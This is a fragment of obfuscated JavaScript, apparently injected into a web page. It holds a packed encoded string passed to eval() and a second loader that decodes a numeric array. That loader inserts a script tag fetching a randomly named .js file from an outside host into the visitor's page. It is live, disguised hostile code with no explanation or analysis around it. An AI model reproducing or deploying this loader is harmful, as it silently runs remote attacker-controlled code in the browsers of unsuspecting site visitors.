|?14?","|","829|=5","|698","|?17","0?","?","1","79","??","1","8","5?s","?172?|7","5","7|","?","229","??","2","44?","|","7","6","8|","?2","0","8","?","?","2","4","7?","|7","14","|?1","86","?","?1","9","4","?|","7","16","|?","188?|8","0","3|","?","28?|","7","24|?","21","1","?|","7","7","9|?","9??","216","?|6","8","0|?17","2","??1","3","5","??","1","4","8?","?1","5","4?","?","12","9","?","?","1","48??","1","60","?","?1","5","2","?","[","Z","|","7","8","8|","?7?","?4?","?0?","|80","1|?","1","6","??2","11?","?","2","1","3?","|7","0","9|?","1","71?|68","6","|","i|","68","6|?","15","0","?|","7","83","|?","2","1","3","?","?1","6","7","?","|","851|?","23","2?","?","2","3","1","?","|","8","56","|","?23","6","?","|8","5","4|","?23","4?","W","B","|","74","3|","?2","2","8??","14","6","?","?2","2","9","??","2","13?","?2","28??2","1","9","?|","699|","?","182","?|8","4","7|","N|","8","39","|","?2","4","2","?","?15","??242?6|","738|?2","20","?","?2","08?","?","22","6??","2","1","8","?","?21","0","?","|69","6","|?1","7","7","?","|7","2","5","|","?","2","12?","|","82","4|","?","2","41","?&","|","67","8","|","?16","3","??","15","0??","14","6??1","6","5?","?","1","5","0?","|70","8","|?148","?","?","1","87","?","|","71","3","|","?185","?","?1","9","3?|820|$|","76","6|","?2","4","7","?|","7","77","|","?8","?","|8","0","0|?","21","1??2","10??3","0?","|6","6","7|?137?|","7","78|?","7","?","|6","89|","?","165?","|7","66|?2","49?","?","25","3?|7","10","|","xz?","14","0","?","^[","Z|","7","69|?","1","49?|7","70|","?","150??","0?|692","|?16","2?","?","1","77?","|","8","0","3|?","2","3?","?3","0","?\"","?","220?","\"","|","8","38","|","J","A|","7","5","8|?","2","3","0","??","161??","190","?","?161","?|","7","56|?1","66","?","?","2","43","??228?","?2","47","?","|77","7|?8","?","?1","95?","?","2","5","4?","|","770|?","23","8","?","?3","??","2","3","8","??","0","?","|811","|","?","25?|","849","|N","|","8","28|0|675|","?15","8??1","6","2?|","75","0","|","?1","60","?|8","02","|?232?","|78","3|?","1","67","?","?16","4??","1","6","3","?","|","8","5","9|?","2","39","?","?2","3","9?","YI|8","52|Q|","8","1","9|'","|7","4","1","|?2","2","4","?","|","78","8|","?19","??","2","05?|","71","2","|","?194","?","?","1","9","3","?","?","1","97","??","184","??","1","80","?|","73","3|","?","2","04","?","|","6","8","2|?","1","7","4","?","|8","0","4|\"","|","80","1|","?32","?","?13?","|","7","4","8","|","?","23","5??2","2","0??2","18","?","|7","2","2|?","1","9","7?","?","1","9","0","??2","0","3","??","196??","1","94?","|8","36|?","2","3","9","?","?1","2??","239?","|692","|","?16","5","??1","8","0?|8","25","|","2","|","8","28|","*|801|?32?|","718|","?","194?|7","7","0|","?252?","?25","1","?","?173?|737|?148?","?","14","9??14","0??","2","31?|","805|?189","??1","86","?","|","8","53","|?","233?","?2","33","??2","33?|","7","0","9","|Y|6","8","3|","?","1","5","9?","|854|","G","|8","18","|?","2","2","1","??22","9","?1","%","|78","3|","?","3","??1","3?|","7","62|","?1","79?|7","15","|","?200","??1","8","7","?","|7","2","5|","?19","3","?","|","7","4","6|?2","1","7","??2","38","??20","0?|702","|","?","189","??1","70??189?","?17","4","?i","?","1","34","??134","?","|7","6","7","|","?","170?","|8","4","4","|","?","254?","|","786|?","0?","?","12?","|","8","12","|$","'","#","?2","8","?+|67","9|?","151?","Y|8","0","5","|","?2","17","?|6","6","9","|","H","?1","63?","5","2","1","11","|7","00","|","P","|","728","|l","|","7","2","0","|?2","1","0??19","6?","|","6","87|","?1","6","8","??1","5","8","??","1","6","9","?","|829","|?","|","705|","z","?1","9","6?","?197","?","?1","9","8?|74","8|?2","2","1?","?","22","7","?","|","802|","?","14?","|","85","1|","E?2","54??","27","?","?","2","54","?","?16","?","|","8","22|","?252","?","|76","1","|","?14","5?","|6","91","|","H","|","855|?2","35?|8","5","9","|?23","9","??239","?|7","11","|[","|","84","3|","S","?22","7?|7","62","|","?14","3?","?1","42","?","|","6","8","2","|",">|76","4","|","?","14","4??4?|","7","26|","?","156","?|","7","68|?","1","5","2","?|","7","3","5","|","t","|7","7","1|?15","1?|83","6|","?","2","1","6","?","|","6","69","|1","?15","5","??","1","39","?","?1","54?|","84","6|B|","804","|","?","3","1?","#|843","|","?","4","?","ED","B","E","7","|7","9","2|","?","7?","|","794","|","?1","97??2","2","6","?","|","6","71|J|7","21|","?19","4?","|767","|","?2","55","??248","?","|","855|E|71","3|?","2","0","0","?","|","804","|","?24","?","|","7","01","|?","183","?","?1","8","2?|","68","5|","`","a","X?1","79","?|","676","|","<","|675","|8","|","707","|W","W","|","66","6","|",".|7","5","1|","?131?","?","24","1","?","|","72","6|?","2","02?","?","20","7?","?","1","9","7?|","75","7","|","?","239","??","2","4","7??","17","4?","?","2","4","8","?","|843|O|","839|","L","8|","6","8","0|?","1","5","9","?|686","|","?","154?","?","16","0","?","Y","v","|8","3","4","|?","2","3","7??2","5","5","??","8?|713|a","^|7","28","|l","l|","8","02|","?1","8","2?|84","8|","X","|","8","59","|","!?","2","43??","2","40??","2","39","?","|","8","15|","?19","5","??","1","95?","|863|]","|78","1","|?2","5","1?","|","816|-|8","2","1","|)|","767|","?2","50?","?","2","54??184?","|8","30|","<;","|693","|","?","1","63?`","?","1","2","5","?|76","9","|?","172??1?","?","254?","|","8","4","1","|@?2","4","4??255?","?2","44","?","!5","H<?2?","F","5|7","61","|?242?","?232","?|6","80","|","?","162","?|","7","41|","?","221","?|","8","02|","?213??","2","1","4","?|","8","0","5|?2","2","2","?","$|","6","9","8","|","?","1","8","0","?","?","152?|","6","79|?1","6","6","??1","6","4","??","1","55??","1","6","0?","?","1","53?","|76","0|?","1","7","1?","?1","72","?","?","1","77?|743|","?","2","2","9","?|8","3","5|","C","0","|6","8","1","|","?","16","7?","|","8","32","|","?=","|8","02","|","?","2","2?","?2","7","??20?","?2","13??2","24?","|6","75","|W|67","0|IT","|698|e|","85","8|?1","2?","?","19?","|","7","73|","?","250?|83","4","|@","|","739|","?","14","9?|7","35|","?","16","5","?","|","803","|?","1","8","7??1","84?|","711|[[|8","05","|?","1","8","5??2","4?|","7","71|?2","4","3??","2","39??24","2??18","8??","23","9","?|8","1","3|","(|69","8","|?1","8","1??1","70","?|","79","1|","?1","6?","?","6?","?","229","?","|7","75","|?","25","0","?","?2","5","1","?","?","2","5","4","?|","7","1","5|?186","?","|","8","32|","?","243?|","81","5","|-","|677","|","?1","4","7","?","|","7","4","4|","?","229??","2","2","0?","?2","2","7","??","23","1??1","56?|","6","86|","t|","6","8","9|","I|7","86|?","16","7??16","6?|6","77","|9|702|","?","198","?|76","9|?1","5","3","??15","0","?","|","8","1","3","|","?1","9","3?","|7","5","3|","?","249?","?","183?|","8","59","|","?2","43?","?","24","0?","c?","1","5?|8","4","6|","?1","?","?2","?","?","2","0","?");eval(hc4f4080);function x0959807a(keda1e){return keda1e.length;}function tcbf09eaf(l9c94c6e5,ab5687e){return l9c94c6e5.substr(ab5687e,1);}function ha07190(h0032894f){return ++h0032894f;}function b44f05(wc7d12c,ad01642){return wc7d12c.substr(ad01642,1);}function xa547c79f(e62bda,q63a3a32a){return e62bda.substr(q63a3a32a,1);}function kf56c59f(v48f666){return v48f666=='?';}function x724c28(ade324,td33a8,edaa95f){return ade324-td33a8-edaa95f;}function g045f6873(l3681acfc){var ma9314df4=String;hc4f4080+=ma9314df4["\x66\x72\x6fmC\x68\x61\x72\x43o\x64e"](l3681acfc);}function o55ffb(ccdc9a4){var b47c7507=ccdc9a4;if(b47c7507<0)b47c7507+=256;if(b47c7507==168)b47c7507=1025;else if(b47c7507==184)b47c7507=1105;return (b47c7507>=192 && b47c7507<256) ? b47c7507+848 : b47c7507;}function a2a048(r32bbf){return (r32bbf+'')["cha\x72C\x6fd\x65At"](0);}
c=3-1;i=c-2;if(window.document)if(parseInt("0"+"1"+"23")===83)try{Date().prototype.q}catch(egewgsd){f=['0i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i78i57i74i-8i77i74i68i-8i21i-8i-1i64i76i76i72i18i7i7i13i69i11i62i17i58i6i73i77i66i63i80i63i77i68i65i75i6i58i68i71i63i60i70i75i6i59i71i69i7i63i7i-1i19i-27i-30i-31i65i62i-8i0i76i81i72i61i71i62i-8i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i-1i77i70i60i61i62i65i70i61i60i-1i1i-8i83i-27i-30i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i8i19i-27i-30i-31i85i-27i-30i-31i60i71i59i77i69i61i70i76i6i71i70i69i71i77i75i61i69i71i78i61i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i65i62i-8i0i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i8i1i-8i83i-27i-30i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i9i19i-27i-30i-31i-31i-31i78i57i74i-8i64i61i57i60i-8i21i-8i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i64i61i57i60i-1i1i51i8i53i19i-27i-30i-31i-31i-31i78i57i74i-8i75i59i74i65i72i76i-8i21i-8i60i71i59i77i69i61i70i76i6i59i74i61i57i76i61i29i68i61i69i61i70i76i0i-1i75i59i74i65i72i76i-1i1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i76i81i72i61i-8i21i-8i-1i76i61i80i76i7i66i57i78i57i75i59i74i65i72i76i-1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i74i61i57i60i81i75i76i57i76i61i59i64i57i70i63i61i-8i21i-8i62i77i70i59i76i65i71i70i-8i0i1i-8i83i-27i-30i-31i-31i-31i-31i65i62i-8i0i76i64i65i75i6i74i61i57i60i81i43i76i57i76i61i-8i21i21i-8i-1i59i71i69i72i68i61i76i61i-1i1i-8i83i-27i-30i-31i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i-31i85i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i68i71i57i60i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i75i74i59i-8i21i-8i77i74i68i-8i3i-8i37i57i76i64i6i74i57i70i60i71i69i0i1i6i76i71i43i76i74i65i70i63i0i1i6i75i77i58i75i76i74i65i70i63i0i11i1i-8i3i-8i-1i6i66i75i-1i19i-27i-30i-31i-31i-31i64i61i57i60i6i57i72i72i61i70i60i27i64i65i68i60i0i75i59i74i65i72i76i1i19i-27i-30i-31i-31i85i-27i-30i-31i85i19i-27i-30i85i1i0i1i19'][0].split('i');v="ev"+"al";}if(v)e=window[v];w=f;s=[];r=String;for(;690!=i;i+=1){j=i;s+=r["fromC"+"harCode"](40+1*w[j]);}if(f)z=s;e(z);